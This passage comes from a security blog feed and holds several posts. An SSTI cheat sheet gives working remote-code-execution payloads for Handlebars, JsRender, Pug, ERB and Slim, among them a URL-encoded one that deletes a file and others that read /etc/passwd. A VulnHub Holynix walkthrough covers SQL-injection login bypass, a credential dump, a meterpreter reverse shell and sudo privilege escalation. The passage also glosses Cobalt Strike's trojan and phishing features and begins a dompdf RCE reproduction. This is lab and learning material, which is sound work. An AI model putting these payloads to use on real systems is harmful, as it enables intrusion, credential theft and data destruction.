class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="builtin-name">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> conslist&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">URL编码:</span></span><br><span class="line"><span class="xml">%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d</span></span><br></pre></td></tr></table></figure><h2 id="2-JsRender"><a href="#2-JsRender" class="headerlink" title="2.JsRender"></a>2.JsRender</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;:%22test%<span class="number">22.</span>toString.constructor.call(&#123;&#125;,%22alert(%27xss%<span class="number">27</span>)%<span class="number">22</span>)()&#125;&#125;</span><br><span class="line">&#123;&#123;:<span class="string">&quot;pwnd&quot;</span>.toString.constructor.call(&#123;&#125;,<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /etc/passwd&#x27;).toString()&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="3-PugJs"><a href="#3-PugJs" class="headerlink" title="3.PugJs"></a>3.PugJs</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test</span></span><br><span class="line">#&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line"><span class="comment">//rce</span></span><br><span class="line">#&#123;<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;localLoad=<span class="built_in">global</span>.process.mainModule.constructor._load;sh=localLoad(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&#x27;touch /tmp/pwned.txt&#x27;</span>)&#125;()&#125;</span><br></pre></td></tr></table></figure><h1 id="5-Ruby中SSTI"><a href="#5-Ruby中SSTI" class="headerlink" title="5.Ruby中SSTI"></a>5.Ruby中SSTI</h1><h2 id="1-ERB"><a href="#1-ERB" class="headerlink" title="1.ERB"></a>1.ERB</h2><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">//test</span></span><br><span class="line"><span class="xml">&#123;&#123;7*7&#125;&#125; = &#123;&#123;7*7&#125;&#125;</span></span><br><span class="line"><span class="xml">$&#123;7*7&#125; = $&#123;7*7&#125;</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> <span class="number">7</span>*<span class="number">7</span> </span><span class="xml">%&gt; = 49</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> foobar </span><span class="xml">%&gt; = Error</span></span><br><span class="line"><span class="xml">//use</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> system(<span class="string">&quot;whoami&quot;</span>) </span><span class="xml">%&gt; #Execute code</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> Dir.entries(<span class="string">&#x27;/&#x27;</span>) </span><span class="xml">%&gt; #List folder</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> File.open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read </span><span class="xml">%&gt; #Read file</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>) </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> <span class="string">`ls /`</span> </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> IO.popen(<span class="string">&#x27;ls /&#x27;</span>).readlines()  </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">require</span> <span class="string">&#x27;open3&#x27;</span> </span><span class="xml">%&gt;&lt;%</span><span class="ruby"> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>=Open3.popen3(<span class="string">&#x27;whoami&#x27;</span>) </span><span class="xml">%&gt;&lt;%=</span><span class="ruby"> <span class="variable">@b</span>.readline()</span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">require</span> <span class="string">&#x27;open4&#x27;</span> </span><span class="xml">%&gt;&lt;%</span><span class="ruby"> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>=Open4.popen4(<span class="string">&#x27;whoami&#x27;</span>) </span><span class="xml">%&gt;&lt;%=</span><span class="ruby"> <span class="variable">@c</span>.readline()</span><span class="xml">%&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-Slim"><a href="#2-Slim" class="headerlink" title="2.Slim"></a>2.Slim</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="number">7</span> * <span class="number">7</span> &#125;</span><br><span class="line">&#123; <span class="string">%x|env|</span> &#125;</span><br></pre></td></tr></table></figure><p>from：</p><blockquote><p>  <a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/</a></p><p>  <a href="https://xz.aliyun.com/t/7518">https://xz.aliyun.com/t/7518</a></p><p>  <a href="https://err0r.top/article/ssti">https://err0r.top/article/ssti</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2022/03/29/SSTI/1344396-20200911174631687-758048107.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-PHP中的ssti&quot;&gt;&lt;a href=&quot;#1-PHP中的sst</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_04_Holynix: v1</title>
    <link href="http://example.com/2022/03/28/VulnHub04/"/>
    <id>http://example.com/2022/03/28/VulnHub04/</id>
    <published>2022-03-27T16:00:00.000Z</published>
    <updated>2022-03-28T10:02:19.385Z</updated>
    
    <content type="html"><![CDATA[<p>download：<a href="https://www.vulnhub.com/entry/holynix-v1,20/">vulnhub</a></p><p>nmap扫一下：<code>192.168.188.138</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.188.138</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)</span><br><span class="line">MAC Address: 00:0C:29:BC:05:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.24 - 2.6.25</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>万能密码：<code>1&#39; or 1=1#</code>登陆，</p><p>upload的时候应该是说这个用户没权限。</p><p>nikto看一下：</p><p><img src="/2022/03/28/VulnHub04/image-20220328170449034.png" alt="image-20220328170449034"></p><p>本地文件包含，在email那里，post直接发：</p><p><img src="/2022/03/28/VulnHub04/image-20220328170704211.png" alt="image-20220328170704211"></p><p><code>sqlmap -u http://192.168.188.138/index.php?page=login.php --forms --data=&quot;username=gmckinnon&quot; -dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] clients</span><br><span class="line">[*] creds</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br></pre></td></tr></table></figure><p>tables:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[5 tables]</span><br><span class="line">+-------------+</span><br><span class="line">| accounts    |</span><br><span class="line">| blogs_table |</span><br><span class="line">| calender    |</span><br><span class="line">| employee    |</span><br><span class="line">| page        |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>dump:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Database: creds</span><br><span class="line">Table: accounts</span><br><span class="line">[11 entries]</span><br><span class="line">+-----+--------+--------------------+------------+</span><br><span class="line">| cid | upload | password           | username   |</span><br><span class="line">+-----+--------+--------------------+------------+</span><br><span class="line">| 1   | 0      | Ih@cK3dM1cR05oF7   | alamo      |</span><br><span class="line">| 2   | 1      | P3n7@g0n0wN3d      | etenenbaum |</span><br><span class="line">| 3   | 1      | d15cL0suR3Pr0J3c7  | gmckinnon  |</span><br><span class="line">| 4   | 1      | Ik1Ll3dNiN@r315er  | hreiser    |</span><br><span class="line">| 5   | 1      | p1@yIngW17hPh0n35  | jdraper    |</span><br><span class="line">| 6   | 1      | @rR35t3D@716       | jjames     |</span><br><span class="line">| 7   | 1      | m@k1nGb0o7L3g5     | jljohansen |</span><br><span class="line">| 8   | 1      | wH@7ar37H3Fed5D01n | kpoulsen   |</span><br><span class="line">| 9   | 0      | f@7H3r0FL1nUX      | ltorvalds  |</span><br><span class="line">| 10  | 1      | n@5aHaSw0rM5       | mrbutler   |</span><br><span class="line">| 11  | 1      | Myd@d51N7h3NSA     | rtmorris   |</span><br><span class="line">+-----+--------+--------------------+------------+</span><br></pre></td></tr></table></figure><p>msfvenom生成反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.188.129 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p>tar写为压缩文件然后上传，msf开监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.188.129</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>进去之后不是root，接下来提权：</p><p>sudo -l看一下有那些命令可以root执行，然后将bash使用chown写为所有组为root，再放到xxx里面，提权成功。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">User www-data may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /bin/chown</span><br><span class="line">    (root) NOPASSWD: /bin/chgrp</span><br><span class="line">    (root) NOPASSWD: /bin/tar</span><br><span class="line">    (root) NOPASSWD: /bin/mv</span><br><span class="line">$ cp /bin/bash /tmp</span><br><span class="line">cp /bin/bash /tmp</span><br><span class="line">$ ls -l /tmp</span><br><span class="line">ls -l /tmp</span><br><span class="line">total 692</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 702160 Nov 18 10:59 bash</span><br><span class="line">$ sudo chown root:root /tmp/bash</span><br><span class="line">sudo chown root:root /tmp/bash</span><br><span class="line">$ sudo mv /tmp/bash /bin/tar</span><br><span class="line">sudo mv /tmp/bash /bin/tar</span><br><span class="line">$ sudo /bin/tar</span><br><span class="line">sudo /bin/tar</span><br><span class="line">root@holynix:/home/etenenbaum<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@holynix:/home/etenenbaum<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download：&lt;a href=&quot;https://www.vulnhub.com/entry/holynix-v1,20/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;nmap扫一下：&lt;code&gt;192.168.188.138&lt;/code&gt;&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/03/20/CSLearn/"/>
    <id>http://example.com/2022/03/20/CSLearn/</id>
    <published>2022-03-20T14:07:45.501Z</published>
    <updated>2022-03-20T15:51:29.200Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">agscript 拓展应用的脚本</span><br><span class="line">c2lint 用于检查profile的错误异常</span><br><span class="line">teamserver 服务端程序</span><br><span class="line">cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</span><br><span class="line">license.pdf 许可证文件</span><br><span class="line">logs 目录记录与目标主机的相关信息 </span><br><span class="line">update，update.jar用于更新CS </span><br><span class="line">third-party 第三方工具</span><br></pre></td></tr></table></figure><h1 id="2-安装运行"><a href="#2-安装运行" class="headerlink" title="2.安装运行"></a>2.安装运行</h1><p>。。。这个就不说了，在服务器上搞了半天，，也不知道为啥，，好像是java环境的问题，最后还是好了。。</p><h1 id="3-译"><a href="#3-译" class="headerlink" title="3.译"></a>3.译</h1><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">New Connection   # 新建连接，支持连接多个服务器端</span><br><span class="line">Preferences   # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</span><br><span class="line">Visualization   # 主要展示输出结果的视图</span><br><span class="line">VPN Interfaces   # 设置VPN接口</span><br><span class="line">Listenrs   # 创建监听器</span><br><span class="line">Script Manager   # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span><br><span class="line">Close   # 退出连接</span><br></pre></td></tr></table></figure><h2 id="view"><a href="#view" class="headerlink" title="view"></a>view</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications   # 显示受害主机的应用信息</span><br><span class="line">Credentials   # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</span><br><span class="line">Downloads   # 查看已下载文件</span><br><span class="line">Event Log   # 主机上线记录以及团队协作聊天记录</span><br><span class="line">Keystrokes   # 查看键盘记录结果</span><br><span class="line">Proxy Pivots   # 查看代理模块</span><br><span class="line">Screenshots   # 查看所有屏幕截图</span><br><span class="line">Script Console   # 加载第三方脚本以增强功能 </span><br><span class="line">Targets   # 显示所有受害主机</span><br><span class="line">Web Log    # 所有Web服务的日志</span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML Application   # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</span><br><span class="line">MS Office Macro   # 生成office宏病毒文件</span><br><span class="line">Payload Generator   # 生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay   # 生成利用自动播放运行的木马文件</span><br><span class="line">Windows Dropper   # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</span><br><span class="line">Windows Executable   # 生成可执行exe木马</span><br><span class="line">Windows Executable(Stageless)   # 生成无状态的可执行exe木马</span><br></pre></td></tr></table></figure><h3 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Manage   # 对开启的web服务进行管理</span><br><span class="line">Clone Site   # 克隆网站，可以记录受害者提交的数据</span><br><span class="line">Host File   # 提供文件下载，可以选择Mime类型</span><br><span class="line">Scripted Web Delivery   # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </span><br><span class="line">Signed Applet Attack   # 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span><br><span class="line">Smart Applet Attack   # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</span><br><span class="line">System Profiler   # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span><br><span class="line">Spear Phish   # 鱼叉钓鱼邮件</span><br></pre></td></tr></table></figure><p><img src="/2022/03/20/CSLearn/201910241554298.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.新建连接</span><br><span class="line">2.断开当前连接</span><br><span class="line">3.监听器</span><br><span class="line">4.改变视图为Pivot Graph(视图列表)</span><br><span class="line">5.改变视图为Session Table(会话列表)</span><br><span class="line">6.改变视图为Target Table(目标列表)</span><br><span class="line">7.显示所有以获取的受害主机的凭证</span><br><span class="line">8.查看已下载文件</span><br><span class="line">9.查看键盘记录结果</span><br><span class="line">10.查看屏幕截图</span><br><span class="line">11.生成无状态的可执行exe木马</span><br><span class="line">12.使用java自签名的程序进行钓鱼攻击</span><br><span class="line">13.生成office宏病毒文件</span><br><span class="line">14.为payload提供web服务以便下载和执行</span><br><span class="line">15.提供文件下载，可以选择Mime类型</span><br><span class="line">16.管理Cobalt Strike上运行的web服务</span><br><span class="line">17.帮助</span><br><span class="line">18.关于</span><br></pre></td></tr></table></figure><h1 id="4-基本流程"><a href="#4-基本流程" class="headerlink" title="4.基本流程"></a>4.基本流程</h1><h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><p>cobalt strike=&gt;listeners=&gt;add，里面有9个Listener</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">indows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http</span><br><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br><span class="line">windows/beacon_smb/bind_pipe</span><br><span class="line">windows/foreign/reverse_dns_txt</span><br><span class="line">windows/foreign/reverse_http</span><br><span class="line">windows/foreign/reverse_https</span><br><span class="line">windows/foreign/reverse_tcp</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-目录结构&quot;&gt;&lt;a href=&quot;#1-目录结构&quot; class=&quot;headerlink&quot; title=&quot;1.目录结构&quot;&gt;&lt;/a&gt;1.目录结构&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>dompdf 0day(RCE)复现</title>
    <link href="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2022-03-19T03:29:49.855Z</updated>
    
    <content type="html"><![CDATA[<p>这次的漏洞是<code>dompdf</code>这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。</p><p>最开始这个漏洞并不是rce，而是xss。</p><p>首先是两个配置：</p><p>在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Enable embedded PHP</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* If this setting is set to true then DOMPDF will automatically evaluate</span></span><br><span class="line"><span class="comment">* embedded PHP contained within  ...  tags.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* ==== IMPORTANT ====</span></span><br><span class="line"><span 